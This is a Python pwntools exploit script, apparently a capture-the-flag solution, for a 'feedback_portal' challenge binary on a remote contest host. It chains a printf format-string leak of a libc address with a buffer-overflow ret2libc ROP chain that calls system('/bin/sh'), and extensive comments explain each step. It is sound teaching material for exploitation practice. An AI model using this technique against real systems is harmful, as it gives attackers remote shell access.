#!/usr/bin/env python3
from pwn import *

#
 # RET2LIBC exploitation
 #
 # Two-stage attack:
 # Stage 1 => format string vulnerability in printf(name) to leak a libc address
 # Stage 2 => buffer overflow in read(feedback, 256) to implement a ret2libc ROP chain
#

p = remote("offsec.m0lecon.it", 13599)

context.binary = elf = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OFFSET_TO_RIP = 136  # found via cyclic pattern 

# To find necessary gadgets, run: ropper --file ./feedback_portal --nocolor --console
# then: 
RET       = 0x40101a    # run: search ret
# POP_RDI = NO RESULT   # run: search pop rdi; ret => this gives NO result, meaning that the gadget is NOT present in the binary,
                        #                             so we have to find this gadget in libc (see first line of Stage 2 below)

# Stage 1: format string leak -> libc base address
# 
# The binary calls printf(name) without a format string, so we can inject
# format specifiers. %N$p prints the value at position N on the stack as a pointer.
# Therefore, we try to send:
#       AAAA.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p
# By scanning positions 4..12 we found that position 11 holds a libc pointer => NOTE: LEAK_IDX = 11 !!!
# (recognizable by the fact that the address starts with "0x7f")
#
# --- This is the output ---
# Please enter your name:
# AAAA.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p
# Hello, AAAA.0x7.(nil).0x7ffff7f954e0.0x7fffffffda70.0x1.0x7ffff7e398a9.0x7ffff7f954e0.0x7ffff7e2f9ca.0x8000
#
# To identify which symbol it pointed to, we ran "info symbol <leaked_address>" inside pwndbg,
# which told us that the leaked address points to "_IO_2_1_stderr_" symbol in libc.
#
# --- This is the output ---
# pwndbg> info symbol 0x7fffffffda70
# No symbol matches 0x7fffffffda70.
# pwndbg> info symbol 0x7ffff7e398a9
# _IO_file_setbuf + 9 in section .text of /usr/lib/x86_64-linux-gnu/libc.so.6
# pwndbg> info symbol 0x7ffff7f954e0
# _IO_2_1_stderr_ in section .data of /usr/lib/x86_64-linux-gnu/libc.so.6
#
# So the leak always points to "_IO_2_1_stderr_", a global FILE struct that libc
# keeps at a fixed offset from its base. The offset is a property of this specific
# libc version and NEVER changes, regardless of ASLR. Therefore:
#   libc.address = leak - libc.symbols['_IO_2_1_stderr_']

LEAK_IDX = 11
p.recvuntil(b'Please enter your name:\n')
p.sendline(f'%{LEAK_IDX}$p'.encode())   # send format string
p.recvuntil(b'Hello, ')

leak = int(p.recvline().strip(), 16)    # parse the printed pointer as an integer
log.info(f'raw leak = {leak:#x}')

libc.address = leak - libc.symbols['_IO_2_1_stderr_']
log.info(f'libc base = {libc.address:#x}')

# Stage 2: BOF ret2libc
# Now that libc.address is set, we can compute the correct runtime addresses of the gadgets
POP_RDI = next(libc.search(asm('pop rdi; ret')))   # "pop rdi; ret" is contained in libc (that's why there is libc.search(...))
BINSH = next(libc.search(b'/bin/sh\x00'))          # the string "/bin/sh" is contained in libc (that's why there is libc.search(...))

p.recvuntil(b'\nNow leave your feedback:\n')
p.send(flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),                       # for stack alignment
    p64(POP_RDI),                   # prepare argument for system()
    p64(BINSH),                     # insert in RDI the address of the string "/bin/sh" in libc, so that by calling system() in the next instruction we will execute system("/bin/sh")
    p64(libc.symbols['system']),    # call system("/bin/sh")
))

p.interactive()
